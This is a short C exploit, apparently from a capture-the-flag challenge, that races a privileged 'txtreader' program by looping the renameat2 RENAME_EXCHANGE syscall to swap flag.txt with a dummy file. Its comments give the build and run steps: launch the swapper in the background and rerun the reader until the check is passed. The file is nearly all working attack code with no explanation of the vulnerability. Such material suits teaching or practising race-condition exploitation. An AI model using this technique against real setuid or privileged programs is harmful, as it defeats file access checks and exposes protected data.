// gcc s.c -o rename2
// touch dummy.txt
// rename2 flag.txt dummy.txt &
// ./txtreader flag.txt            (try this as many times as you need)

#include <unistd.h>
#include <syscall.h>
#include <fcntl.h>
#include <linux/fs.h>

int main(int argc, char** argv) {
  while(1) {
    // syscall to swap filenames
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE); 
  }
  return 0;
}
